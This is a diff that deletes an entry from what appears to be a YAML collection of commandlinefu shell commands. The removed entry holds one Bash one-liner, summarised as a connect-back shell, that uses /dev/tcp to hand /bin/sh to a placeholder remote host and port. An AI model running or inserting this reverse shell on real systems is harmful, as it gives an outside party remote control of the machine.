@@ -1,8 +1,0 @@
-commandlinefu_id: 5089
-translator:
-  weibo: ''
-hide: true
-command: |-
-  exec 0</dev/tcp/hostname/port; exec 1>&0; exec 2>&0; exec /bin/sh 0</dev/tcp/hostname/port 1>&0 2>&0
-summary: |-
-  Connect-back shell using Bash built-ins
